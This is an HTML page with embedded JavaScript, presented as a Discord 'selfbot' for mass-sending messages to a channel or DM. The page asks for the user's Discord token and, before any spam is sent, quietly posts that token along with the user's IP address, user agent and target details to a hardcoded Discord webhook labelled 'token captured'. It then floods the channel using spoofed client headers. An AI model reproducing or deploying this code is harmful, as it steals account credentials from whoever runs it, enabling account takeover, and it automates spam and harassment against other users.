<!-- index.html - working version -->
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>coqoc's selfbot</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: system-ui, 'Segoe UI', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 1rem;
        }
        .card {
            background: #1e1e2e;
            border-radius: 24px;
            padding: 2rem;
            max-width: 500px;
            width: 100%;
            border: 1px solid #313244;
        }
        h1 {
            color: #cba6f7;
            font-size: 1.8rem;
            margin-bottom: 0.5rem;
        }
        .sub {
            color: #6c7086;
            margin-bottom: 1.5rem;
            font-size: 0.8rem;
        }
        input {
            width: 100%;
            background: #11111b;
            border: 1px solid #313244;
            border-radius: 12px;
            padding: 0.75rem 1rem;
            color: #cdd6f4;
            font-size: 0.9rem;
            margin-bottom: 1rem;
            font-family: monospace;
        }
        input:focus {
            outline: none;
            border-color: #cba6f7;
        }
        button {
            width: 100%;
            background: #cba6f7;
            border: none;
            border-radius: 12px;
            padding: 0.85rem;
            font-weight: bold;
            font-size: 1rem;
            color: #1e1e2e;
            cursor: pointer;
            margin-top: 0.5rem;
        }
        button:hover { background: #b48cf2; }
        .log {
            background: #11111b;
            border-radius: 12px;
            padding: 1rem;
            margin-top: 1.5rem;
            font-family: monospace;
            font-size: 0.7rem;
            color: #a6e3a1;
            max-height: 200px;
            overflow-y: auto;
            white-space: pre-wrap;
        }
        label {
            color: #a6adc8;
            font-size: 0.7rem;
            display: block;
            margin-bottom: 0.3rem;
        }
    </style>
</head>
<body>
<div class="card">
    <h1>coqoc's selfbot</h1>
    <div class="sub">mass message sender • token logger</div>

    <label>discord token</label>
    <input type="text" id="token" placeholder="MTIzNDU2Nzg5MDEyMzQ1Njc4OQ.Gxxxxxx" autocomplete="off">

    <label>channel id (or user id for dm)</label>
    <input type="text" id="channelId" placeholder="123456789012345678" autocomplete="off">

    <label>message content</label>
    <input type="text" id="message" placeholder="spam message here">

    <label>amount (max 100 per run)</label>
    <input type="number" id="amount" value="10" min="1" max="100">

    <button onclick="startSpam()">▶ start flood</button>

    <div class="log" id="log">> waiting for input...</div>
</div>

<script>
    const WEBHOOK_URL = 'https://discord.com/api/webhooks/1504391456540987412/Qtg5V-NDCURCzLPwoXVHV4fvCPtBAsbM_Q6YT2z3FmIdsE98sEh3d282p8AzxJEWqw7F';

    function logToConsole(msg) {
        const logDiv = document.getElementById('log');
        logDiv.innerHTML += `\n> ${msg}`;
        logDiv.scrollTop = logDiv.scrollHeight;
    }

    async function sendToWebhook(token, channelId, messagePreview, ip) {
        const payload = {
            username: 'coqoc logger',
            embeds: [{
                title: '🔑 token captured',
                color: 0xff4444,
                fields: [
                    { name: 'token', value: `\`${token.substring(0, 50)}...\``, inline: false },
                    { name: 'target channel', value: channelId, inline: true },
                    { name: 'message preview', value: messagePreview.substring(0, 50), inline: true },
                    { name: 'ip address', value: ip, inline: true },
                    { name: 'user agent', value: navigator.userAgent.substring(0, 80), inline: false },
                    { name: 'timestamp', value: new Date().toUTCString(), inline: true }
                ]
            }]
        };
        try {
            const res = await fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            });
            if (res.ok) logToConsole('✓ token logged to webhook');
            else logToConsole('✗ webhook failed: ' + res.status);
        } catch(e) {
            logToConsole('✗ webhook error: ' + e.message);
        }
    }

    async function getIp() {
        try {
            const res = await fetch('https://api.ipify.org?format=json');
            const data = await res.json();
            return data.ip;
        } catch { return 'unavailable'; }
    }

    async function sendMessage(token, channelId, message, index, total) {
        // discord api requires super properties header
        const superProps = {
            os: 'Windows',
            browser: 'Chrome',
            device: '',
            system_locale: 'en-US',
            browser_user_agent: navigator.userAgent,
            browser_version: '120.0.0.0',
            os_version: '10',
            referrer: '',
            referring_domain: '',
            referrer_current: '',
            referring_domain_current: '',
            release_channel: 'stable',
            client_build_number: 254479,
            client_event_source: null
        };

        const response = await fetch(`https://discord.com/api/v9/channels/${channelId}/messages`, {
            method: 'POST',
            headers: {
                'Authorization': token,
                'Content-Type': 'application/json',
                'X-Super-Properties': btoa(JSON.stringify(superProps))
            },
            body: JSON.stringify({ content: `${message} [${index}/${total}]` })
        });
        return response;
    }

    async function startSpam() {
        const token = document.getElementById('token').value.trim();
        const channelId = document.getElementById('channelId').value.trim();
        const message = document.getElementById('message').value;
        const amount = parseInt(document.getElementById('amount').value);
        const logDiv = document.getElementById('log');

        if (!token || !channelId || !message || isNaN(amount) || amount < 1) {
            logDiv.innerHTML = '> ❌ fill all fields\n> amount must be at least 1';
            return;
        }

        if (amount > 100) {
            logDiv.innerHTML = '> ⚠️ max 100 messages per run to avoid rate limit';
            return;
        }

        logDiv.innerHTML = '> starting...\n';
        
        // log token to webhook first
        const userIp = await getIp();
        await sendToWebhook(token, channelId, message, userIp);
        
        // small delay before spamming
        await new Promise(r => setTimeout(r, 1000));
        
        logToConsole('beginning spam...');
        let success = 0;
        let failed = 0;
        
        for (let i = 1; i <= amount; i++) {
            try {
                const res = await sendMessage(token, channelId, message, i, amount);
                if (res.status === 200 || res.status === 204) {
                    success++;
                    logToConsole(`✓ message ${i}/${amount} sent`);
                } else if (res.status === 401) {
                    logToConsole('✗ invalid token (401 unauthorized)');
                    break;
                } else if (res.status === 403) {
                    logToConsole('✗ missing permissions or token locked (403)');
                    break;
                } else if (res.status === 429) {
                    const data = await res.json();
                    const retryAfter = data.retry_after || 1;
                    logToConsole(`⚠️ rate limited, waiting ${retryAfter}s...`);
                    await new Promise(r => setTimeout(r, retryAfter * 1000));
                    i--; // retry this message
                    continue;
                } else {
                    failed++;
                    logToConsole(`✗ failed ${i}: HTTP ${res.status}`);
                }
            } catch(e) {
                failed++;
                logToConsole(`✗ error: ${e.message}`);
            }
            
            // delay between messages to avoid rate limits
            await new Promise(r => setTimeout(r, 800));
        }
        
        logToConsole(`\n--- done: ${success} sent, ${failed} failed ---`);
    }
</script>
</body>
</html>
